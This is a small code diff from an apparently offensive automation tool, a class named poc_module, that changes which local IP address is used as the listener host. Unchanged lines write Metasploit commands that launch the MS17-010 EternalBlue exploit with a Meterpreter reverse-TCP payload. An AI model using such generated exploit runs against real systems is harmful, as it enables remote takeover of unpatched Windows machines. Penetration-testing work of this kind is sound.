@@ -27,7 +27,7 @@ class poc_module:
         #1 for bridege
         #2 localhost
         #3 vpn
-        lhost = subprocess.check_output(["hostname -I | awk '{print $1}'"],shell=True).decode("utf-8")
+        lhost = subprocess.check_output(["hostname -I | awk '{print $2}'"],shell=True).decode("utf-8")
         if module == "ms17010":
             file.write('use exploit/windows/smb/ms17_010_eternalblue \n')
             file.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp\n')
